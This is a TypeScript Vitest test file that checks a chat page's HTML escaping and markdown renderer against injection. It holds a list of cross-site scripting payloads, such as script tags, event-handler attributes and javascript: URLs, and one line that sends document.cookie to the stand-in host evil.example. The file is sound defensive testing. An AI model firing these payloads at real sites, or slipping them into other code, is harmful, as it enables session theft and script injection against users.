import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { Window } from "happy-dom";
import { beforeAll, describe, expect, it } from "vitest";

// Load the chat renderer straight out of the shipped page so these regression
// tests always exercise the exact code that runs in production.
const html = readFileSync(fileURLToPath(new URL("./thrn.html", import.meta.url)), "utf8");

function extract(name: string): string {
  const start = html.indexOf(`function ${name}(`);
  if (start === -1) throw new Error(`${name}() not found in thrn.html`);
  let depth = 0;
  for (let i = html.indexOf("{", start); i < html.length; i++) {
    if (html[i] === "{") depth++;
    else if (html[i] === "}") {
      depth--;
      if (depth === 0) return html.slice(start, i + 1);
    }
  }
  throw new Error(`Could not find end of ${name}()`);
}

const { escapeHtml, renderMarkdown } = (
  new Function(
    `${extract("escapeHtml")}\n${extract("renderMarkdown")}\nreturn { escapeHtml, renderMarkdown };`,
  ) as () => {
    escapeHtml: (s: unknown) => string;
    renderMarkdown: (s: string) => string;
  }
)();

// --- DOM-level assertions: parse the rendered HTML and prove no live
// script/embed nodes, event handlers, or script-y URLs made it through. ---

let doc: Document;

beforeAll(() => {
  doc = new Window().document as unknown as Document;
});

const FORBIDDEN_TAGS = [
  "script",
  "iframe",
  "object",
  "embed",
  "style",
  "link",
  "meta",
  "base",
  "form",
  "img",
  "svg",
  "math",
  "audio",
  "video",
  "a",
  "input",
  "textarea",
];

const TRUSTED_HANDLERS = new Set(["chatSend(this.dataset.q)"]);

function assertSafe(rendered: string) {
  const host = doc.createElement("div");
  host.innerHTML = rendered;

  for (const tag of FORBIDDEN_TAGS) {
    expect(
      host.querySelectorAll(tag).length,
      `rendered output created a live <${tag}> element: ${rendered}`,
    ).toBe(0);
  }

  for (const el of Array.from(host.querySelectorAll("*"))) {
    for (const attr of Array.from(el.attributes)) {
      if (attr.name.startsWith("on")) {
        // The only inline handler the renderer is allowed to emit is its own
        // follow-up button handler.
        expect(
          TRUSTED_HANDLERS.has(attr.value.trim()),
          `untrusted inline handler ${attr.name}="${attr.value}" in: ${rendered}`,
        ).toBe(true);
      }
      if (attr.name === "href" || attr.name === "src" || attr.name === "action") {
        expect(attr.value).not.toMatch(/^\s*(javascript|data|vbscript):/i);
      }
    }
  }
  return host;
}

const PAYLOADS = [
  `<script>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<svg/onload=alert(1)>`,
  `<iframe src="javascript:alert(1)"></iframe>`,
  `"><script>alert(1)</script>`,
  `' onmouseover='alert(1)`,
  `<body onload=alert(1)>`,
  `<a href="javascript:alert(1)">click</a>`,
  `<style>*{background:url(javascript:alert(1))}</style>`,
  `<object data="data:text/html,<script>alert(1)</script>"></object>`,
  `&lt;script&gt;alert(1)&lt;/script&gt;`,
  `<!--<script>alert(1)</script>-->`,
  `<math><mtext><script>alert(1)</script></mtext></math>`,
  `<form><button formaction="javascript:alert(1)">x</button></form>`,
  `</p><script>alert(1)</script><p>`,
  `<div onclick="alert(1)">x</div>`,
  `<input autofocus onfocus=alert(1)>`,
  `<script>fetch('https://evil.example/'+document.cookie)</script>`,
];

describe("escapeHtml", () => {
  it("escapes every HTML metacharacter", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("escapes ampersands first so entities cannot be smuggled through", () => {
    expect(escapeHtml("&lt;script&gt;")).toBe("&amp;lt;script&amp;gt;");
  });

  it("coerces non-string input safely", () => {
    expect(escapeHtml(null)).toBe("null");
    expect(escapeHtml(undefined)).toBe("undefined");
    expect(escapeHtml(123)).toBe("123");
  });
});

describe("renderMarkdown neutralizes model/user-controlled HTML", () => {
  for (const payload of PAYLOADS) {
    it(`neutralizes: ${payload.slice(0, 44)}`, () => {
      const rendered = renderMarkdown(payload);
      const host = assertSafe(rendered);
      // The payload survives only as visible text, with markup escaped.
      if (payload.includes("<")) expect(rendered).toContain("&lt;");
      expect(host.textContent?.length).toBeGreaterThan(0);
    });
  }

  it("keeps payloads inert inside markdown constructs while markdown still renders", () => {
    const out = renderMarkdown(
      "## <script>alert(1)</script>\n\n**<img src=x onerror=alert(1)>**\n\n`<svg/onload=alert(1)>`\n\n- <iframe src=javascript:alert(1)>\n\n1. <object data=x>",
    );
    assertSafe(out);
    expect(out).toContain("<h4>");
    expect(out).toContain("<strong>");
    expect(out).toContain("<code>");
    expect(out).toContain("<li");
  });

  it("escapes follow-up buttons in both attribute and text position", () => {
    const out = renderMarkdown(
      `Answer.\n\nFollow-ups:\n- " onclick="alert(1)" x="\n- <script>alert(1)</script>`,
    );
    const host = assertSafe(out);
    const buttons = host.querySelectorAll("button.fq-btn");
    expect(buttons.length).toBeGreaterThan(0);
    for (const btn of Array.from(buttons)) {
      expect(btn.getAttribute("onclick")).toBe("chatSend(this.dataset.q)");
    }
  });

  it("escapes framework tag content", () => {
    const host = assertSafe(renderMarkdown("[FRAMEWORK: <img src=x onerror=alert(1)>]"));
    expect(host.querySelectorAll("span.fw-tag").length).toBe(1);
  });

  it("keeps a long mixed payload inert", () => {
    const payload = PAYLOADS.join("\n\n");
    assertSafe(renderMarkdown(payload));
  });
});

describe("chat rendering call sites", () => {
  it("never interpolates untrusted chat text into chat innerHTML without renderMarkdown", () => {
    // Every innerHTML assignment on a chat surface (bubble/messages/row).
    const statements = [
      ...html.matchAll(/\b(?:bubble|msgs|row)\.innerHTML\s*=\s*([\s\S]*?);/g),
    ].map((m) => m[1].trim());
    expect(statements.length).toBeGreaterThan(0);

    // Identifiers that can hold model- or user-controlled text.
    const UNTRUSTED = /\b(fullText|detail|userText|text|content|payload|raw|errText)\b/;

    for (const stmt of statements) {
      if (stmt.includes("renderMarkdown(")) continue; // escaped by the renderer
      expect(
        UNTRUSTED.test(stmt),
        `chat innerHTML assignment interpolates untrusted data: ${stmt}`,
      ).toBe(false);
    }
  });



  it("renders user messages with textContent, never innerHTML", () => {
    const start = html.indexOf("function addUserMsg(");
    expect(start).toBeGreaterThan(-1);
    const fn = html.slice(start, html.indexOf("\nfunction ", start + 10));
    expect(fn).toContain("bubble.textContent = text");
    expect(fn).not.toContain("innerHTML");
  });

  it("escapes before any markdown substitution runs", () => {
    const src = extract("renderMarkdown");
    const escapeAt = src.indexOf("escapeHtml(");
    const firstReplaceAt = src.indexOf(".replace(");
    expect(escapeAt).toBeGreaterThan(-1);
    expect(escapeAt).toBeLessThan(firstReplaceAt);
  });
});
